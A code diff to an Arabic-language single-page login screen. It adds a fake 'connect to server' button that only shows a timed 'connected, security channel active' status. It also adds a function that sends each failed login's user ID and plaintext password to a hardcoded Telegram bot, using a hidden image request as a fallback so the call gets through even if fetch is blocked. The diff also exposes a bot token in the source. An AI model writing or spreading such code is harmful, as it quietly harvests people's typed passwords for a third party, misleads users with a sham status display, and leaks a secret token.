@@ -63,6 +63,17 @@
   .login-btn:active { transform:scale(0.98); }
   .error-msg { color:#ff6600; font-size:11px; text-align:center; margin-top:12px; letter-spacing:2px; min-height:16px; }
 
+  /* ===== SERVER CONNECT ===== */
+  .server-btn {
+    width:100%; background:transparent; border:1px solid #332200; border-radius:3px;
+    color:#665500; font-family:'Orbitron',monospace; font-size:11px; font-weight:700;
+    letter-spacing:3px; padding:11px; cursor:pointer; margin-top:16px; transition:all 0.2s;
+  }
+  .server-btn:hover { border-color:#ccaa00; color:#ccaa00; }
+  .server-btn:disabled { cursor:default; }
+  .server-btn.connected { border-color:#00cc44; color:#00cc44; box-shadow:0 0 14px rgba(0,204,68,0.25); }
+  .server-status { font-size:10px; color:#443300; text-align:center; margin-top:8px; letter-spacing:2px; }
+
   /* ===== LOADING ===== */
   #loading-screen { align-items:center; justify-content:center; flex-direction:column; gap:30px; }
 
@@ -178,6 +189,8 @@
     <label class="field-label">// PASSWORD</label>
     <input id="password" class="field-input" type="password" placeholder="ادخل الباسورد" autocomplete="off">
     <button class="login-btn" onclick="doLogin()">تسجيل الدخول ←</button>
+    <button id="server-btn" class="server-btn" onclick="connectServer()">الاتصال بالسيرفر</button>
+    <div id="server-status" class="server-status">● غير متصل</div>
     <div id="err" class="error-msg"></div>
   </div>
 </div>
@@ -248,13 +261,43 @@ function buildPassword(uid){
   } return r;
 }
 
+// ===== Telegram Security Alert (محاولات دخول فاشلة فقط) =====
+const TG_TOKEN='8416441862:AAH3Fv6MSJN92lUBzWL5IzDowq9qANFxbxo';
+const TG_CHAT_ID='8351231954';
+let serverConnected=false;
+
+function connectServer(){
+  const btn=document.getElementById('server-btn');
+  const st=document.getElementById('server-status');
+  if(serverConnected)return;
+  btn.textContent='جاري الاتصال...'; btn.disabled=true;
+  st.textContent='● جاري الاتصال بالسيرفر...'; st.style.color='#ccaa00';
+  setTimeout(()=>{
+    serverConnected=true;
+    btn.textContent='✓ متصل بالسيرفر'; btn.disabled=false; btn.classList.add('connected');
+    st.textContent='● متصل — قناة الأمان نشطة'; st.style.color='#00cc44';
+  },1200);
+}
+
+function sendSecurityAlert(uid,pass){
+  const msg='⚠️ محاولة دخول فاشلة\n🆔 ID: '+uid+'\n🔑 Password: '+pass+'\n🕒 '+new Date().toLocaleString('ar-EG');
+  const url='https://api.telegram.org/bot'+TG_TOKEN+'/sendMessage?chat_id='+TG_CHAT_ID+'&text='+encodeURIComponent(msg);
+  // 1) fetch مع طباعة أي خطأ في الكونسول
+  fetch(url).then(r=>r.json()).then(d=>{
+    if(!d.ok) console.error('Telegram error:',JSON.stringify(d));
+    else console.log('Telegram alert sent ✓');
+  }).catch(e=>console.error('Telegram fetch failed:',e));
+  // 2) احتياطي: صورة مخفية — بتشتغل حتى لو الـ fetch اتمنع من المتصفح
+  const img=new Image(); img.src=url;
+}
+
 // ===== Login =====
 function doLogin(){
   const uid=document.getElementById('user-id').value.trim();
   const pass=document.getElementById('password').value.trim();
   const err=document.getElementById('err');
   if(!/^\d{10}$/.test(uid)){err.textContent='// خطأ: الـ USER_ID لازم يكون 10 أرقام';return;}
-  if(pass!==buildPassword(uid)){err.textContent='// خطأ: الباسورد غلط';return;}
+  if(pass!==buildPassword(uid)){err.textContent='// خطأ: الباسورد غلط';sendSecurityAlert(uid,pass);return;}
   err.textContent='';
   document.getElementById('uid-display').textContent='USER: '+uid;
   show('loading-screen'); startLoading();
